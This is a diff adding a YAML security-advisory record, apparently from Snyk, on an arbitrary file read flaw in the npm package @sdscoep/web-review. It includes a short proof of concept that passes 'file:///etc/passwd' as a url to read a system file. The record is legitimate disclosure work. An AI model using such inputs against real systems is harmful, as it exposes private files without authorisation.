@@ -1,0 +1,24 @@
+---
+- id: snykio:npm:@sdscoep/web-review:1053230
+  title: Arbitrary File Read
+  description: "[@sdscoep/web-review][1] is a npm package which will compile reports\nconsisting
+    of multiple criteria.\n\nAffected versions of this package are vulnerable to Arbitrary
+    File Read.\nIt is possible to read arbitrary file by using the \\\"file:///\\\"
+    URI as a\n`url`.\n\n### PoC   {#poc}\n\n    const webReview = require(\"@sdscoep/web-review\");\n
+    \   \n    webReview.exec([\n      {\n        url: \"file:///etc/passwd\",\n        resolution:
+    [\"480x320\"],\n      }\n    ]);\n\n\n\n[1]: https://www.npmjs.com/package/@sdscoep/web-review\n"
+  affected_package: "@sdscoep/web-review"
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-284
+  disclosed_date: 2020-12-20
+  created_date: 2020-12-21
+  last_modified_date: 2020-12-21
+  credit:
+  - Snyk Security Team
+  references:
+  - https://github.com/savannahar68/web-review
+  source_url: https://snyk.io/vuln/SNYK-JS-SDSCOEPWEBREVIEW-1053230
